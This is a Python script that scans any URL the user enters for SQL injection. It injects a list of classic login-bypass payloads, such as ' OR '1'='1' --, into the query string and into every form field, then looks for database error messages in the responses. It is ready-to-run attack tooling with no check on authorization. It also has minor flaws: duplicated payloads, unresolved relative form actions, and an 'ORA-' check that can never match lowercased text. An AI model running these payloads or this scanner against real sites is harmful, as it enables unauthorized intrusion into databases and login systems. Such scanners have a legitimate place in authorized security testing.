import requests
from bs4 import BeautifulSoup
import re


payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 'a'='a",
    "') OR ('a'='a",
    "') OR '1'='1",
    "') OR 1=1--",
    "') OR 1=1#",
    "' OR ''='",
    "' OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "' OR 1=1/*",
    "') OR '1'='1",
]


error_messages = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "mysql_fetch_array()",
    "syntax error",
    "mysql_fetch_assoc()",
    "mysql_num_rows()",
    "mysql_query()",
    "pg_query()",
    "sql error",
    "ORA-",
]

def scan_url(url):
    vulnerable = False
    for payload in payloads:
        
        injected_url = url + payload
        print(f"Testing {injected_url}")

        try:
            response = requests.get(injected_url, timeout=10)
            content = response.text.lower()

            
            for error in error_messages:
                if error in content:
                    print(f"Vulnerability found with payload: {payload}")
                    vulnerable = True
                    break

            if vulnerable:
                break

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

    if not vulnerable:
        print("No SQL injection vulnerability found.")
    else:
        print("SQL injection vulnerability detected!")

def extract_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        return forms
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return []

def scan_forms(url, forms):
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")

        form_url = url if not action else action
        data = {input.get("name"): "test" for input in inputs if input.get("name")}

        if method == "get":
            scan_url(form_url + "?" + "&".join([f"{key}={value}" for key, value in data.items()]))
        else:
            for payload in payloads:
                data = {key: payload for key in data.keys()}
                try:
                    response = requests.post(form_url, data=data, timeout=10)
                    content = response.text.lower()

                    for error in error_messages:
                        if error in content:
                            print(f"Vulnerability found in form with payload: {payload}")
                            return True
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                    continue
    return False

if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")

    
    scan_url(target_url)

    
    forms = extract_forms(target_url)
    if forms:
        print(f"Found {len(forms)} form(s) on the page.")
        if scan_forms(target_url, forms):
            print("SQL injection vulnerability detected in forms!")
        else:
            print("No SQL injection vulnerability found in forms.")
    else:
        print("No forms found on the page.")

